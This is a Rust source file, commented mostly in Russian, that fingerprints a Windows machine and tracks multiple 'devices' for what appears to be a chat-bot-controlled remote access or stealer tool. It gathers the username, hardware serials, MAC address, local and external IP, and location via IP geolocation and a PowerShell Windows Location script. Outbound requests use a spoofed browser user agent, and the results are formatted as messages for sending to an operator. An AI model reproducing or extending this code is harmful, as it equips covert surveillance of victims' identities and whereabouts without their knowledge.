use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use serde::{Deserialize, Serialize};
use chrono::{DateTime, Utc};
use sha2::{Sha256, Digest};
use anyhow::{Result, Context};

/// Device information
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeviceInfo {
    pub device_id: String,
    pub device_name: String,
    pub computer_name: String,
    pub username: String,
    pub os_version: String,
    pub architecture: String,
    pub local_ip: String,
    pub external_ip: String,
    pub mac_address: String,
    pub gps_location: String, // GPS координаты если доступны
    pub first_seen: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    pub is_online: bool,
    pub hardware_id: String,
}

impl DeviceInfo {
    /// Create new device information
    pub async fn new() -> Result<Self> {
        let device_id = Self::generate_device_id()?;
        let device_name = Self::get_device_name()?;
        let computer_name = Self::get_computer_name()?;
        let username = Self::get_username()?;
        let os_version = Self::get_os_version()?;
        let architecture = Self::get_architecture()?;
        let local_ip = Self::get_local_ip()?;
        let external_ip = Self::get_external_ip().await.unwrap_or_else(|_| "Недоступен".to_string());
        let mac_address = Self::get_mac_address()?;
        let gps_location = Self::get_gps_location().await.unwrap_or_else(|_| "Недоступно".to_string());
        let hardware_id = Self::generate_hardware_id()?;
        
        let now = Utc::now();
        
        Ok(DeviceInfo {
            device_id,
            device_name,
            computer_name,
            username,
            os_version,
            architecture,
            local_ip,
            external_ip,
            mac_address,
            gps_location,
            first_seen: now,
            last_seen: now,
            is_online: true,
            hardware_id,
        })
    }

    /// Generate unique device ID на основе аппаратных характеристик
    fn generate_device_id() -> Result<String> {
        let computer_name = Self::get_computer_name()?;
        let username = Self::get_username()?;
        let hardware_id = Self::generate_hardware_id()?;
        
        let combined = format!("{}-{}-{}", computer_name, username, hardware_id);
        let mut hasher = Sha256::new();
        hasher.update(combined.as_bytes());
        let hash = hasher.finalize();
        
        Ok(format!("{:x}", hash)[..16].to_string())
    }

    /// Генерирует ID на основе аппаратных характеристик
    fn generate_hardware_id() -> Result<String> {
        use std::process::Command;
        
        // Пытаемся получить серийный номер процессора
        let cpu_id = Command::new("wmic")
            .args(&["cpu", "get", "ProcessorId", "/value"])
            .output()
            .map(|output| {
                String::from_utf8_lossy(&output.stdout)
                    .lines()
                    .find(|line| line.starts_with("ProcessorId="))
                    .map(|line| line.replace("ProcessorId=", ""))
                    .unwrap_or_else(|| "unknown".to_string())
            })
            .unwrap_or_else(|_| "unknown".to_string());

        // Пытаемся получить серийный номер материнской платы
        let motherboard_id = Command::new("wmic")
            .args(&["baseboard", "get", "SerialNumber", "/value"])
            .output()
            .map(|output| {
                String::from_utf8_lossy(&output.stdout)
                    .lines()
                    .find(|line| line.starts_with("SerialNumber="))
                    .map(|line| line.replace("SerialNumber=", ""))
                    .unwrap_or_else(|| "unknown".to_string())
            })
            .unwrap_or_else(|_| "unknown".to_string());

        let combined = format!("{}-{}", cpu_id, motherboard_id);
        let mut hasher = Sha256::new();
        hasher.update(combined.as_bytes());
        let hash = hasher.finalize();
        
        Ok(format!("{:x}", hash)[..12].to_string())
    }

    /// Get device name
    fn get_device_name() -> Result<String> {
        use std::env;
        Ok(env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".to_string()))
    }

    /// Get computer name
    fn get_computer_name() -> Result<String> {
        use std::env;
        Ok(env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".to_string()))
    }

    /// Get username
    fn get_username() -> Result<String> {
        use std::env;
        use std::process::Command;
        
        // Метод 1: переменная окружения USERNAME
        if let Ok(username) = env::var("USERNAME") {
            if !username.is_empty() {
                return Ok(username);
            }
        }
        
        // Метод 2: переменная окружения USER
        if let Ok(username) = env::var("USER") {
            if !username.is_empty() {
                return Ok(username);
            }
        }
        
        // Метод 3: whoami команда
        if let Ok(output) = Command::new("whoami").output() {
            let username = String::from_utf8_lossy(&output.stdout).trim().to_string();
            if !username.is_empty() {
                // Убираем домен если есть (DOMAIN\username -> username)
                if let Some(user_part) = username.split('\\').last() {
                    return Ok(user_part.to_string());
                }
                return Ok(username);
            }
        }
        
        // Метод 4: wmic команда
        if let Ok(output) = Command::new("wmic")
            .args(&["computersystem", "get", "username", "/value"])
            .output()
        {
            let output_str = String::from_utf8_lossy(&output.stdout);
            for line in output_str.lines() {
                if line.starts_with("UserName=") {
                    let username = line.replace("UserName=", "").trim().to_string();
                    if !username.is_empty() {
                        if let Some(user_part) = username.split('\\').last() {
                            return Ok(user_part.to_string());
                        }
                        return Ok(username);
                    }
                }
            }
        }
        
        Ok("Неизвестен".to_string())
    }

    /// Получает версию ОС
    fn get_os_version() -> Result<String> {
        use std::process::Command;
        
        let output = Command::new("cmd")
            .args(&["/C", "ver"])
            .output()
            .context("Failed to get OS version")?;
            
        let version = String::from_utf8_lossy(&output.stdout)
            .lines()
            .next()
            .unwrap_or("Unknown")
            .to_string();
            
        Ok(version)
    }

    /// Получает архитектуру системы
    fn get_architecture() -> Result<String> {
        use std::env;
        Ok(env::var("PROCESSOR_ARCHITECTURE").unwrap_or_else(|_| "Unknown".to_string()))
    }

    /// Get local IP address
    fn get_local_ip() -> Result<String> {
        use std::net::UdpSocket;
        
        // Метод 1: Попытка подключения к внешнему серверу
        if let Ok(socket) = UdpSocket::bind("0.0.0.0:0") {
            if socket.connect("8.8.8.8:80").is_ok() {
                if let Ok(addr) = socket.local_addr() {
                    return Ok(addr.ip().to_string());
                }
            }
        }
        
        // Метод 2: Использование Windows API
        #[cfg(windows)]
        {
            use windows::Win32::NetworkManagement::IpHelper::{GetAdaptersAddresses, IP_ADAPTER_ADDRESSES_LH, GAA_FLAG_INCLUDE_PREFIX};
            use windows::Win32::Networking::WinSock::{AF_INET, SOCKADDR_IN};
            
            unsafe {
                let mut buffer_size = 0u32;
                GetAdaptersAddresses(AF_INET.0 as u32, GAA_FLAG_INCLUDE_PREFIX, None, None, &mut buffer_size);
                
                let mut buffer = vec![0u8; buffer_size as usize];
                let result = GetAdaptersAddresses(
                    AF_INET.0 as u32,
                    GAA_FLAG_INCLUDE_PREFIX,
                    None,
                    Some(buffer.as_mut_ptr() as *mut IP_ADAPTER_ADDRESSES_LH),
                    &mut buffer_size,
                );
                
                if result == 0 {
                    let adapter = buffer.as_ptr() as *const IP_ADAPTER_ADDRESSES_LH;
                    if !adapter.is_null() {
                        let adapter_ref = &*adapter;
                        if !adapter_ref.FirstUnicastAddress.is_null() {
                            let addr = &*adapter_ref.FirstUnicastAddress;
                            if !addr.Address.lpSockaddr.is_null() {
                                let sockaddr = &*(addr.Address.lpSockaddr as *const SOCKADDR_IN);
                                let ip_bytes = sockaddr.sin_addr.S_un.S_addr.to_le_bytes();
                                return Ok(format!("{}.{}.{}.{}", ip_bytes[0], ip_bytes[1], ip_bytes[2], ip_bytes[3]));
                            }
                        }
                    }
                }
            }
        }
        
        Ok("127.0.0.1".to_string())
    }

    /// Get external IP address
    pub async fn get_external_ip() -> Result<String> {
        // Попробуем несколько сервисов для получения внешнего IP
        let services = vec![
            "https://ipapi.co/ip/",
            "https://api.ipify.org",
            "https://icanhazip.com",
            "https://ident.me",
            "https://checkip.amazonaws.com",
        ];
        
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(10))
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()
            .context("Failed to create HTTP client")?;
        
        for service_url in services {
            match client.get(service_url).send().await {
                Ok(response) => {
                    if response.status().is_success() {
                        match response.text().await {
                            Ok(ip) => {
                                let ip = ip.trim().to_string();
                                if !ip.is_empty() && ip.contains('.') {
                                    return Ok(ip);
                                }
                            }
                            Err(_) => continue,
                        }
                    }
                }
                Err(_) => continue,
            }
        }
        
        // Если все сервисы недоступны, попробуем через DNS
        match std::process::Command::new("nslookup")
            .args(&["myip.opendns.com", "resolver1.opendns.com"])
            .output()
        {
            Ok(output) => {
                let output_str = String::from_utf8_lossy(&output.stdout);
                for line in output_str.lines() {
                    if line.contains("Address:") && !line.contains("#") {
                        if let Some(ip) = line.split_whitespace().last() {
                            if ip.contains('.') && ip != "127.0.0.1" {
                                return Ok(ip.to_string());
                            }
                        }
                    }
                }
            }
            Err(_) => {},
        }
        
        Ok("Недоступен".to_string())
    }

    /// Get MAC address
    fn get_mac_address() -> Result<String> {
        use std::process::Command;
        
        // Метод 1: getmac команда
        if let Ok(output) = Command::new("getmac")
            .args(&["/fo", "csv", "/nh"])
            .output()
        {
            let mac_output = String::from_utf8_lossy(&output.stdout);
            for line in mac_output.lines() {
                if let Some(mac) = line.split(',').next() {
                    let mac = mac.trim_matches('"').trim();
                    if !mac.is_empty() && mac != "N/A" && mac.contains('-') {
                        return Ok(mac.to_string());
                    }
                }
            }
        }
        
        // Метод 2: wmic команда
        if let Ok(output) = Command::new("wmic")
            .args(&["path", "Win32_NetworkAdapter", "where", "NetConnectionStatus=2", "get", "MACAddress", "/value"])
            .output()
        {
            let output_str = String::from_utf8_lossy(&output.stdout);
            for line in output_str.lines() {
                if line.starts_with("MACAddress=") {
                    let mac = line.replace("MACAddress=", "").trim().to_string();
                    if !mac.is_empty() && mac.contains(':') {
                        return Ok(mac);
                    }
                }
            }
        }
        
        // Метод 3: ipconfig /all
        if let Ok(output) = Command::new("ipconfig")
            .args(&["/all"])
            .output()
        {
            let output_str = String::from_utf8_lossy(&output.stdout);
            for line in output_str.lines() {
                if line.contains("Physical Address") || line.contains("Физический адрес") {
                    if let Some(mac_part) = line.split(':').nth(1) {
                        let mac = mac_part.trim().to_string();
                        if !mac.is_empty() && mac.contains('-') {
                            return Ok(mac);
                        }
                    }
                }
            }
        }
            
        Ok("Недоступен".to_string())
    }

    /// Получает GPS координаты (если доступны)
    pub async fn get_gps_location() -> Result<String> {
        // Метод 1: Попытка получить координаты через IP геолокацию
        if let Ok(external_ip) = Self::get_external_ip().await {
            if external_ip != "Недоступен" {
                let client = reqwest::Client::builder()
                    .timeout(std::time::Duration::from_secs(10))
                    .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
                    .build()
                    .context("Failed to create HTTP client")?;
                
                // Попробуем несколько сервисов геолокации
                let geolocation_services = vec![
                    format!("http://ip-api.com/json/{}", external_ip),
                    format!("https://ipapi.co/{}/json/", external_ip),
                    "https://ipapi.co/json/".to_string(),
                ];
                
                for service_url in geolocation_services {
                    if let Ok(response) = client.get(&service_url).send().await {
                        if response.status().is_success() {
                            if let Ok(json) = response.json::<serde_json::Value>().await {
                                // Проверяем разные форматы ответа
                                let lat = json["lat"].as_f64()
                                    .or_else(|| json["latitude"].as_f64());
                                let lon = json["lon"].as_f64()
                                    .or_else(|| json["longitude"].as_f64());
                                
                                if let (Some(latitude), Some(longitude)) = (lat, lon) {
                                    let city = json["city"].as_str().unwrap_or("Неизвестен");
                                    let country = json["country"].as_str()
                                        .or_else(|| json["country_name"].as_str())
                                        .unwrap_or("Неизвестна");
                                    
                                    return Ok(format!(
                                        "{:.4}, {:.4} ({}, {})", 
                                        latitude, longitude, city, country
                                    ));
                                }
                            }
                        }
                    }
                }
            }
        }
        
        // Метод 2: Попытка использовать Windows Location API (требует разрешений)
        #[cfg(windows)]
        {
            // Этот метод работает только если пользователь дал разрешение на геолокацию
            if let Ok(location) = Self::get_windows_location() {
                return Ok(location);
            }
        }
        
        Ok("Недоступно (Нет GPS/разрешений)".to_string())
    }

    #[cfg(windows)]
    fn get_windows_location() -> Result<String> {
        use std::process::Command;
        
        // Попытка получить координаты через PowerShell и Windows Location API
        let script = r#"
            Add-Type -AssemblyName System.Device
            $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
            $GeoWatcher.Start()
            Start-Sleep -Seconds 3
            $Coordinate = $GeoWatcher.Position.Location
            if ($Coordinate.IsUnknown -eq $false) {
                Write-Output "$($Coordinate.Latitude), $($Coordinate.Longitude)"
            } else {
                Write-Output "Unknown"
            }
            $GeoWatcher.Stop()
        "#;
        
        if let Ok(output) = Command::new("powershell")
            .args(&["-Command", script])
            .output()
        {
            let result = String::from_utf8_lossy(&output.stdout).trim().to_string();
            if !result.is_empty() && result != "Unknown" && result.contains(',') {
                return Ok(format!("{} (Windows Location)", result));
            }
        }
        
        Err(anyhow::anyhow!("Windows location not available"))
    }

    /// Обновляет время последней активности
    pub fn update_last_seen(&mut self) {
        self.last_seen = Utc::now();
        self.is_online = true;
    }

    /// Форматирует информацию об устройстве для отправки
    pub fn format_info(&self) -> String {
        format!(
            "🖥️ **Информация об устройстве**\n\
            📱 ID: `{}`\n\
            💻 Имя: `{}`\n\
            👤 Пользователь: `{}`\n\
            🖥️ Компьютер: `{}`\n\
            🔧 ОС: `{}`\n\
            ⚙️ Архитектура: `{}`\n\
            🌐 Локальный IP: `{}`\n\
            🌍 Внешний IP: `{}`\n\
            📡 MAC: `{}`\n\
            � GPS: `{}`\n\
            �🔑 Hardware ID: `{}`\n\
            ⏰ Первый вход: `{}`\n\
            🕒 Последняя активность: `{}`\n\
            🟢 Статус: {}",
            self.device_id,
            self.device_name,
            self.username,
            self.computer_name,
            self.os_version,
            self.architecture,
            self.local_ip,
            self.external_ip,
            self.mac_address,
            self.gps_location,
            self.hardware_id,
            self.first_seen.format("%Y-%m-%d %H:%M:%S UTC"),
            self.last_seen.format("%Y-%m-%d %H:%M:%S UTC"),
            if self.is_online { "Онлайн" } else { "Оффлайн" }
        )
    }
}

/// Менеджер устройств
#[derive(Debug)]
pub struct DeviceManager {
    devices: Arc<Mutex<HashMap<String, DeviceInfo>>>,
    current_device: Arc<Mutex<Option<DeviceInfo>>>,
}

impl DeviceManager {
    /// Создает новый менеджер устройств
    pub fn new() -> Self {
        Self {
            devices: Arc::new(Mutex::new(HashMap::new())),
            current_device: Arc::new(Mutex::new(None)),
        }
    }

    /// Инициализирует текущее устройство
    pub async fn initialize_current_device(&self) -> Result<String> {
        let device_info = DeviceInfo::new().await?;
        let device_id = device_info.device_id.clone();
        
        // Сохраняем информацию о текущем устройстве
        {
            let mut current = self.current_device.lock().unwrap();
            *current = Some(device_info.clone());
        }
        
        // Добавляем в список всех устройств
        {
            let mut devices = self.devices.lock().unwrap();
            devices.insert(device_id.clone(), device_info);
        }
        
        log::info!("Device initialized with ID: {}", device_id);
        Ok(device_id)
    }

    /// Получает информацию о текущем устройстве
    pub fn get_current_device(&self) -> Option<DeviceInfo> {
        let current = self.current_device.lock().unwrap();
        current.clone()
    }

    /// Получает устройство по ID
    pub fn get_device(&self, device_id: &str) -> Option<DeviceInfo> {
        let devices = self.devices.lock().unwrap();
        devices.get(device_id).cloned()
    }

    /// Обновляет активность устройства
    pub fn update_device_activity(&self, device_id: &str) {
        let mut devices = self.devices.lock().unwrap();
        if let Some(device) = devices.get_mut(device_id) {
            device.update_last_seen();
        }
        
        // Обновляем текущее устройство, если это оно
        let mut current = self.current_device.lock().unwrap();
        if let Some(ref mut current_device) = current.as_mut() {
            if current_device.device_id == device_id {
                current_device.update_last_seen();
            }
        }
    }

    /// Проверяет, является ли ID валидным для этого устройства
    pub fn is_valid_device_id(&self, device_id: &str) -> bool {
        if let Some(current) = self.get_current_device() {
            return current.device_id == device_id;
        }
        false
    }

    /// Получает список всех устройств
    pub fn get_all_devices(&self) -> Vec<DeviceInfo> {
        let devices = self.devices.lock().unwrap();
        devices.values().cloned().collect()
    }

    /// Форматирует список всех устройств
    pub fn format_devices_list(&self) -> String {
        let devices = self.get_all_devices();
        
        if devices.is_empty() {
            return "📱 Нет зарегистрированных устройств".to_string();
        }
        
        let mut result = String::from("📱 **Список устройств:**\n\n");
        
        for device in devices {
            let status_icon = if device.is_online { "🟢" } else { "🔴" };
            let time_diff = Utc::now().signed_duration_since(device.last_seen);
            let time_ago = if time_diff.num_minutes() < 60 {
                format!("{} мин назад", time_diff.num_minutes())
            } else if time_diff.num_hours() < 24 {
                format!("{} ч назад", time_diff.num_hours())
            } else {
                format!("{} дн назад", time_diff.num_days())
            };
            
            result.push_str(&format!(
                "{} **{}** (`{}`)\n\
                └ 👤 {} | 🌐 {} | 🕒 {}\n\n",
                status_icon,
                device.device_name,
                device.device_id,
                device.username,
                device.external_ip,
                time_ago
            ));
        }
        
        result
    }

    /// Генерирует новый ID для устройства (для команды /reroll)
    pub async fn reroll_device_id(&self) -> Result<String> {
        let new_device_info = DeviceInfo::new().await?;
        let new_id = new_device_info.device_id.clone();
        
        // Удаляем старое устройство и добавляем новое
        {
            let mut devices = self.devices.lock().unwrap();
            if let Some(current) = self.get_current_device() {
                devices.remove(&current.device_id);
            }
            devices.insert(new_id.clone(), new_device_info.clone());
        }
        
        // Обновляем текущее устройство
        {
            let mut current = self.current_device.lock().unwrap();
            *current = Some(new_device_info);
        }
        
        log::info!("Device ID rerolled to: {}", new_id);
        Ok(new_id)
    }
}

impl Default for DeviceManager {
    fn default() -> Self {
        Self::new()
    }
}
